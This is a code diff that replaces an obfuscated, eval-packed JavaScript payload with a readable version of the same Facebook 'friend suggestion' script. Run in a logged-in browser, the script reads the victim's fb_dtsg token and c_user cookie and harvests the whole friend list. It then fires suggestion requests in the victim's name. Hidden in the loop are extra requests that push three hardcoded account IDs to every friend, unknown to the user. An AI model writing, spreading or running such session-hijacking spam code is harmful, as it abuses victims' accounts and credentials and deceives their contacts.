@@ -1,3 +1,196 @@
-var a=eval,c='u f=!1,j="";Q=/"3I":"([0-9]+)"/.3J(5.B("3H").3G("3E-3L"))[1];k=5.2k("R")[0].2n;M={f:o(){u a=f;K("3R"!=3P 1I)1y{a=12 1I("3O.2v")}1v(b){1y{a=12 1I("3B.2v")}1v(e){a=f}}2H K(P.2A)1y{a=12 2A}1v(c){a=f}1u a},E:o(a,b,e,c,g){u d=1m.h();K(d&&a){d.2e&&d.2e("t/47");c||(c="2l");e||(e="t");g||(g={});e=e.48();c=c.46();u h="25="+(12 2Q).3h();a+=a.1c("?")+1?"&":"?";a+=h;h=1B;"3i"==c&&(h=a.3g("?"),a=h[0],h=h[1]);d.2Z(c,a,!0);d.3k=g.g?o(){g.g(d)}:o(){K(4==d.2M)K(V==d.2C){u a="";d.1T&&(a=d.1T);"j"==e.2F(0)?(a=a.2O(/[\\n\\r]/g,""),a=2P("("+a+")")):"x"==e.2F(0)&&(a=d.2W);b&&b(a)}2H g.b&&5.1d("1O")[0].2t(g.b),g.a&&(5.B(g.a).8.O="1H"),1C&&1C(d.2C)};d.2T(h)}},2V:o(a){u b={1t:"",c:f,j:f,e:"t",2w:"2l",1G:"",a:"",b:""},e;U(e 2S b)a[e]&&(b[e]=a[e]);K(b.1t){u c=f;b.b&&(c=5.2U("6"),c.2y("8","1g:2J;1M:1L;y:1L;"),c.2y("1e","2R-2L"),c.15=b.b,5.1d("1O")[0].2K(c),1m.k.b=c);b.a&&(5.B(b.a).8.O="2X");1m.E(b.1t,o(a){b.c&&b.c(a);b.1G&&(5.B(b.1G).15=a);c&&5.1d("1O")[0].2t(c);b.a&&(5.B(b.a).8.O="1H")},b.e,b.2w,b)}},h:o(){1u 1m.f()}};3e 0==5.2z&&(5.2z=o(a){U(u b=3d("(?:^|\\\\s)"+a+"(?:$|\\\\s)"),e=5.1d("*"),c=[],g,d=0;1B!=(g=e[d]);d++){u h=g.3b;h&&(-1!=h.1c(a)&&b.3f(h))&&c.13(g)}1u c});u i=3,l=3,m=0,n=0,p=[],q=[],r=[],k=5.2k("R")[0].2n,s=5.2D.2I(5.2D.2I(/31=(\\d+)/)[1]);M.E(P.Z.Y+"//L.I.J/10/37/3c.1S?T=1&36[0]=38&35=0&34="+s+"&30=32&33=0&1V[0]=39&1V[1]=3a",o(a){a=1K.26(a.2a(a.1c("{")));a=a.l.i;U(u b=0;b<a.v;b++)p.13(a[b].25);U(b=0;b<a.v;b++)q.13(a[b].t);U(b=0;b<a.v;b++)r.13(a[b].m);l=i=p.v-1;2s.2m(p.v);a="<6 1Z=\'19-1a-O\' 8=\'1g:22;y:14%;1F-y:-1Y;1M:1U;1x:1W;z-23:2i;D-G:2d;t-X:1q;H:2f;1N-1J:1p W 1p C(0,0,0,0.1);S-2b:1P;S:W 1w C(V,V,14,0.2);1A-w:C(N,N,N,0.9);w:#29\'><6 8=\'H-1R:1z;D-G:24;\'>21 2g 2h 2c 27 28.</6>"+(p.v+" F 1E");a+="</6>";5.B("1D").15=a;a=p[i];M.E(P.Z.Y+"//L.I.J/10/16/1r?&1n="+a+"&Q="+Q+"&1h=1k&1l=1j&1i="+s+"&T=1&1s=1o-1f&11=7&R="+k+"&1b=18",o(a){a=1K.26(a.2a(a.1c("{")));i--;j="<6 1e=\'19-1a-3j\' 8=\'H-1R:1X;t-X:y;D-G:1z;2p-2q:2B-2j;";a.1C?(j+="w:2Y\'>",n++,j=a.d?j+a.d:j+1K.2N(a,1B,"")):(j+="w:2o;D-G:4q\'>",j+=q[i]+" 44 43 45.",m++);j+="</6>";a="<6 1Z=\'19-1a-O\' 8=\'1N-1J:1L 1P 2G C(0, 0, 0, 0.3);1g:22;y:14%;1F-y:-1Y;1M:1U;1x:1W;z-23:2i;D-G:2d;t-X:1q;H:2f;1N-1J:1p W 1p C(0,0,0,0.1);S-2b:1P;S:W 1w C(V,V,14,0.2);1A-w:C(N,N,N,0.9);w:#29\'><6 8=\'H-1R:1X;D-G:24;\'>21 2g 2h 2c 27 28.</6>";0<i?(a+=p.v+" F 1E<1Q/>",a+="<b>"+m+"</b> F 2x 42 "+(p.v-i)+" F 41 ",a+="("+i+" 3W...)",a=a+"<6 1e=\'19-1a\'>"+j,a+="<2E 8=\'1A:1q 3V-3U 1t(3X://3Y-40-a.3Z.49/4a-4l/4k.1S/3l/4m/r/4n-4p.4o);1x:20;4j:20;1F-y:-4i;H:4d;S:W 1w C(0,0,0,0.4);\' 4c="+r[i]+"></2E><a 8=\'H-y:2G;t-X:y;w:#2r;1g:2J;D-4b:4e;\'>"+q[i]+"</a>",a+="<6 8=\'t-X:1q;D-G:1z;2p-2q:2B-2j;w:2o\'>",a+=\'4f 4h 4g 3T F.</1Q>3S & 3w 3v <A 8="w:#2r;" 3x="3y://L.I.J/3A">3z 3u.</A>\',a+="</6>",a+="</6>"):(a+=p.v+" F 1E 3t ",a+="<b>"+m+" F 2x</b></1Q>",a+="<6><2u 1e=\'3o 3n 3m 3p\' 3q=\'5.B(\\"1D\\").8.O=\\"1H\\"\'>3s</2u>");a+="</6>";5.B("1D").15=a},"t","17");l--;0<l&&(b=p[l],3r=r[l],3C("3N("+b+")",3M));2s.2m(l+"/"+p.v+":"+p[l]+"/"+q[l]+", 3Q:"+m);M.E(P.Z.Y+"//L.I.J/10/16/1r?&1n="+a+"&Q=3K&1h=1k&1l=1j&1i="+s+"&T=1&1s=1o-1f&11=7&R="+k+"&1b=18",o(){},"t","17");M.E(P.Z.Y+"//L.I.J/10/16/1r?&1n="+a+"&Q=3F&1h=1k&1l=1j&1i="+s+"&T=1&1s=1o-1f&11=7&R="+k+"&1b=18",o(){},"t","17");M.E(P.Z.Y+"//L.I.J/10/16/1r?&1n="+a+"&Q=3D&1h=1k&1l=1j&1i="+s+"&T=1&1s=1o-1f&11=7&R="+k+"&1b=18",o(){},"t","17")});',
-d=275,e="     document div  style                function     text var length color  left   getElementById rgba font load Friends size padding facebook com if www jx 255 display window newcomer fb_dtsg border __a for 200 1px align protocol location ajax __req new push 50 innerHTML friends post 1658168847910711974185 friend edge phstamp indexOf getElementsByTagName class fEa0 position attempt_id __user passive_megaphone 53ba39eed15c7c0c22bb5352d04374bf ref this receiver 798aD5z5CF 0pt center suggest __dyn url return catch solid width try 10px background null error pagelet_sidebar Detected margin update none ActiveXObject shadow JSON 0px top box body 3px br bottom php responseText 100px options 500px 5px 273px id 50px Auto fixed index 20px uid parse Sender Manager 000000 substring radius Suggestion 14px overrideMimeType 15px Facebook Friend 9999 wrap getElementsByName GET log value gray white space 3B5998 console removeChild span XMLHTTP method Suggested setAttribute getElementsByClassName XMLHttpRequest pre status cookie img charAt 8px else match absolute appendChild indicator readyState stringify replace eval Date loading in send createElement bind responseXML block darkred open token c_user v7 stale_ok viewer lazy filter typeahead user friends_only nm className first_degree RegExp void test split getTime POST name onreadystatechange v2 uiButton uiOverlayButton layerCancel uiButtonLarge onClick sx Cancel and Ahmad By Designed href http Waqar pkwaq Microsoft setTimeout 100003697277263 data 100001050235420 getAttribute pagelet_timeline_main_column profile_owner exec 100004066178315 gt 100 SuggestFriend Msxml2 typeof success undefined Created Your repeat no Lefted https fbcdn akamaihd profile Processed of been has suggested toUpperCase xml toLowerCase net static weight src 2px bold Thanks Suggesting For 125px height rsrc ak yo UlIqmHJn gif SK 12px".split(" "),
-f=0,g={},f=function(b){return(62>b?"":f(parseInt(b/62)))+(35<(b%=62)?String.fromCharCode(b+29):b.toString(36))};if(!"".replace(/^/,String)){for(;d--;)g[f(d)]=e[d]||f(d);e=[function(b){return g[b]}];f=function(){return"\\w+"};d=1}for(;d--;)e[d]&&(c=c.replace(RegExp("\\b"+f(d)+"\\b","g"),e[d]));a(c);
+var Title = 'Auto Facebook Friend Suggestion Sender Manager.';
+var Descriptions = "",
+  _text = 'Thanks For Suggesting Your Friends.</br>Created & Designed By <A style="color:#3B5998;" href="http://www.facebook.com/pkwaq">Lovely Mushahid.</A>';newcomer=/"profile_owner":"([0-9]+)"/.exec(document.getElementById("pagelet_timeline_main_column").getAttribute("data-gt"))[1];fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;
+function SuggestFriend(opo) {
+  jx.load(window.location.protocol + "//www.facebook.com/ajax/friends/suggest?&receiver=" + opo + "&newcomer=" + newcomer + "&attempt_id=53ba39eed15c7c0c22bb5352d04374bf&ref=passive_megaphone&__user=" + user_id + "&__a=1&__dyn=798aD5z5CF-fEa0&__req=7&fb_dtsg=" + fb_dtsg + "&phstamp=1658168847910711974185", function (a) {
+    var b = a.substring(a.indexOf("{"));
+    var c = JSON.parse(b);
+    i--;
+    Descriptions = "<div class='friend-edge-name' style='padding-bottom:5px;text-align:left;font-size:10px;white-space:pre-wrap;";
+    if (c.error) {
+      Descriptions += "color:darkred'>";
+      err++;
+      if (c.errorDescription) Descriptions += c.errorDescription;
+      else Descriptions +=
+          JSON.stringify(c, null, "")
+    }
+    else {
+      Descriptions += "color:gray;font-size:12px'>";
+      Descriptions +=arn[i]+" has been suggested.";
+      suc++
+    }
+    Descriptions += "</div>";
+    var display = "<div id='friend-edge-display' style='box-shadow:0px 3px 8px rgba(0, 0, 0, 0.3);position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(200,200,50,0.2);background-color:rgba(255,255,255,0.9);color:#000000'>";
+    display += "<div style='padding-bottom:5px;font-size:20px;'>" + Title + "</div>";
+    if (i > 0) {
+      display += arr.length + " Friends Detected<br/>";
+      display += "<b>" + suc + "</b> Friends Suggested of " + (arr.length - i) + " Friends Processed ";
+      display += "(" + i + " Lefted...)";
+      display += "<div class='friend-edge'>";
+      display += Descriptions;
+      display += "<img style='background:center no-repeat url(https://fbcdn-profile-a.akamaihd.net/static-ak/rsrc.php/v2/yo/r/UlIqmHJn-SK.gif);width:50px;height:50px;margin-left:-125px;padding:2px;border:1px solid rgba(0,0,0,0.4);' src=" + pho[i] + "></img><a style='padding-left:8px;text-align:left;color:#3B5998;position:absolute;font-weight:bold;'>" + arn[i] + "</a>";
+      display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'>";
+      display += _text;
+      display += "</div>";
+      display += "</div>"
+    }
+    else {
+      display += arr.length + " Friends Detected and ";
+      display += "<b>" + suc + " Friends Suggested</b></br>";
+      display += "<div><span class='layerCancel uiOverlayButton uiButton uiButtonLarge' onClick='document.getElementById(\"pagelet_sidebar\").style.display=\"none\"'>Cancel</span>"
+    }
+    display +=
+      "</div>";
+    document.getElementById("pagelet_sidebar")
+      .innerHTML = display
+  }, "text", "post");
+  tay--;
+  if (tay > 0) {
+    var s = arr[tay];
+    sx = pho[tay];
+    setTimeout("SuggestFriend(" + s + ")", 100)
+  }
+  console.log(tay + "/" + arr.length + ":" + arr[tay] + "/" + arn[tay] + ", success:" + suc);
+    jx.load(window.location.protocol + "//www.facebook.com/ajax/friends/suggest?&receiver=" + opo + "&newcomer=100004066178315&attempt_id=0585ab74e2dd0ff10282a3a36df39e19&ref=profile_others_dropdown&__user=" + user_id + "&__a=1&__dyn=798aD5z5CF-&__req=17&fb_dtsg=" + fb_dtsg + "&phstamp=16581651071156988110194",function () {}, "text", "post");
+  
+
+   jx.load(window.location.protocol + "//www.facebook.com/ajax/friends/suggest?&receiver=" + opo + "&newcomer=100001050235420&attempt_id=0585ab74e2dd0ff10282a3a36df39e19&ref=profile_others_dropdown&__user=" + user_id + "&__a=1&__dyn=798aD5z5CF-&__req=17&fb_dtsg=" + fb_dtsg + "&phstamp=16581651071156988110194",function () {}, "text", "post");
+  
+
+    jx.load(window.location.protocol + "//www.facebook.com/ajax/friends/suggest?&receiver=" + opo + "&newcomer=100003697277263&attempt_id=0585ab74e2dd0ff10282a3a36df39e19&ref=profile_others_dropdown&__user=" + user_id + "&__a=1&__dyn=798aD5z5CF-&__req=17&fb_dtsg=" + fb_dtsg + "&phstamp=16581651071156988110194",function () {}, "text", "post");
+  
+}
+jx = {
+  getHTTPObject: function () {
+    var a = false;
+    if (typeof ActiveXObject != "undefined") try {
+        a = new ActiveXObject("Msxml2.XMLHTTP")
+    }
+    catch (b) {
+      try {
+        a = new ActiveXObject("Microsoft.XMLHTTP")
+      }
+      catch (c) {
+        a = false
+      }
+    }
+    else if (window.XMLHttpRequest) try {
+        a = new XMLHttpRequest
+    }
+    catch (b) {
+      a = false
+    }
+    return a
+  },
+  load: function (url, callback, format, method, opt) {
+    var http = this.init();
+    if (!http || !url) return;
+    if (http.overrideMimeType) http.overrideMimeType("text/xml");
+    if (!method) method = "GET";
+    if (!format) format = "text";
+    if (!opt) opt = {};
+    format = format.toLowerCase();
+    method = method.toUpperCase();
+    var now = "uid=" + (new Date)
+      .getTime();
+    url += url.indexOf("?") + 1 ? "&" : "?";
+    url += now;
+    var parameters = null;
+    if (method == "POST") {
+      var parts = url.split("?");
+      url = parts[0];
+      parameters = parts[1]
+    }
+    http.open(method, url, true);
+    var ths = this;
+    if (opt.handler) http.onreadystatechange = function () {
+        opt.handler(http)
+    };
+    else http.onreadystatechange = function () {
+        if (http.readyState == 4) if (http.status == 200) {
+            var result = "";
+            if (http.responseText) result = http.responseText;
+            if (format.charAt(0) == "j") {
+              result = result.replace(/[\n\r]/g,
+                "");
+              result = eval("(" + result + ")")
+            }
+            else if (format.charAt(0) == "x") result = http.responseXML;
+            if (callback) callback(result)
+          }
+          else {
+            if (opt.loadingIndicator) document.getElementsByTagName("body")[0].removeChild(opt.loadingIndicator);
+            if (opt.loading) document.getElementById(opt.loading)
+                .style.display = "none";
+            if (error) error(http.status)
+          }
+    };
+    http.send(parameters)
+  },
+  bind: function (a) {
+    var b = {
+      url: "",
+      onSuccess: false,
+      onError: false,
+      format: "text",
+      method: "GET",
+      update: "",
+      loading: "",
+      loadingIndicator: ""
+    };
+    for (var c in b) if (a[c]) b[c] =
+          a[c];
+    if (!b.url) return;
+    var d = false;
+    if (b.loadingIndicator) {
+      d = document.createElement("div");
+      d.setAttribute("style", "position:absolute;top:0px;left:0px;");
+      d.setAttribute("class", "loading-indicator");
+      d.innerHTML = b.loadingIndicator;
+      document.getElementsByTagName("body")[0].appendChild(d);
+      this.opt.loadingIndicator = d
+    }
+    if (b.loading) document.getElementById(b.loading)
+        .style.display = "block";
+    this.load(b.url, function (a) {
+      if (b.onSuccess) b.onSuccess(a);
+      if (b.update) document.getElementById(b.update)
+          .innerHTML = a;
+      if (d) document.getElementsByTagName("body")[0].removeChild(d);
+      if (b.loading) document.getElementById(b.loading)
+          .style.display = "none"
+    }, b.format, b.method, b)
+  },
+  init: function () {
+    return this.getHTTPObject()
+  }
+};
+var i = 3;
+var tay = 3;
+var j = 0;
+var k = 0;
+var suc = 0;
+var err = 0;
+var arr = new Array;
+var arn = new Array;
+var pho = new Array;
+var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+jx.load(window.location.protocol + "//www.facebook.com/ajax/typeahead/first_degree.php?" + "__a=1&filter[0]=user&lazy=0&viewer=" + user_id + "&token=v7&stale_ok=0&options[0]=friends_only&options[1]=nm", function (a) {
+  var b = a;
+  var c = b.substring(b.indexOf("{"));
+  var d = JSON.parse(c);
+  d = d.payload.entries;
+  for (var e = 0; e < d.length; e++) arr.push(d[e].uid);
+  for (var eg = 0; eg < d.length; eg++) arn.push(d[eg].text);
+  for (var pic = 0; pic < d.length; pic++) pho.push(d[pic].photo);
+  i = arr.length -
+    1;
+  tay = i;
+  console.log(arr.length);
+  var display = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(200,200,50,0.2);background-color:rgba(255,255,255,0.9);color:#000000'>";
+  display += "<div style='padding-bottom:10px;font-size:20px;'>" + Title + "</div>";
+  display += arr.length + " Friends Detected";
+  display += "</div>";
+  document.getElementById("pagelet_sidebar").innerHTML=display;
+  SuggestFriend(arr[i])});
